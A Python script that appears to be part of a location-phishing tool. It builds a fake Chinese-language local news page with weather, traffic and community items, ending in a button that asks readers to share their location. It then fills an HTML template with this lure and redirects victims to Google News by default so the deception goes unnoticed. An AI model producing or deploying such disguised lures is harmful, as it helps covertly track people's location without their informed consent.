#!/usr/bin/env python3
import os
import utils

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

title = '您所在地区今日天气与交通速报'
desc = '实时天气、路况和社区动态，为您提供身边的本地资讯。'
image = ''
content = '''
<p>受冷空气南下影响，今日大部分地区气温较昨日下降 3-5°C，早晚温差较大，请注意添衣保暖。气象部门预计，未来三天将以多云天气为主，局部地区有阵雨。</p>

<div class="data-grid">
    <div class="data-item">
        <span class="label">体感温度</span>
        <span class="value">18°C</span>
    </div>
    <div class="data-item">
        <span class="label">空气湿度</span>
        <span class="value">62%</span>
    </div>
    <div class="data-item">
        <span class="label">风速</span>
        <span class="value">3级</span>
    </div>
    <div class="data-item">
        <span class="label">空气质量</span>
        <span class="value">良好</span>
    </div>
</div>

<p>交通方面，早高峰期间城区主要道路车流量较大，建议通勤用户提前规划路线。地铁 2 号线因设备维护，部分站点临时调整运营间隔，请乘客留意站内广播。交管部门提醒，今日限行尾号 4 和 9，限行时间为 7:00 至 20:00。</p>

<p>社区活动方面，本周末将在市民广场举办春季公益市集，届时将有手工艺品展销、儿童互动游戏和免费健康义诊等项目，欢迎居民踊跃参加。滨江公园周日早 8 点将举办社区健步走活动，参与者可到社区中心领取纪念品。</p>

<p>医疗健康方面，社区卫生服务中心即日起延长夜间门诊时间至 21:00，方便上班族就医。区人民医院新增线上预约挂号功能，居民可通过微信公众号提前预约，减少排队等候时间。</p>

<p>教育资讯，今年秋季学区划分调整方案已出炉，各街道办事处即日起接受家长咨询。新增两所普惠性幼儿园预计 9 月开园，目前正在进行师资招聘和设施验收工作。</p>

<p>如需获取您所在位置的精准天气和实时路况，请点击下方按钮，我们将根据您的位置提供个性化资讯。</p>
'''

redirect = os.getenv('REDIRECT')

if redirect is None:
    redirect = 'https://news.google.com/'
    utils.print(f'{G}[+] {C}Redirect URL : {W}{redirect} (default)')
else:
    utils.print(f'{G}[+] {C}Redirect URL : {W}{redirect}')

with open('template/news_local/index_temp.html', 'r') as temp_index:
    temp_index_data = temp_index.read()
    temp_index_data = temp_index_data.replace('$TITLE$', title)
    temp_index_data = temp_index_data.replace('$DESC$', desc)
    temp_index_data = temp_index_data.replace('$IMAGE$', image)
    temp_index_data = temp_index_data.replace('$CONTENT$', content)
    temp_index_data = temp_index_data.replace('REDIRECT_URL', redirect)
    if os.getenv("DEBUG_HTTP"):
        temp_index_data = temp_index_data.replace('window.location = "https:" + restOfUrl;', '')

with open('template/news_local/index.html', 'w') as updated_index:
    updated_index.write(temp_index_data)
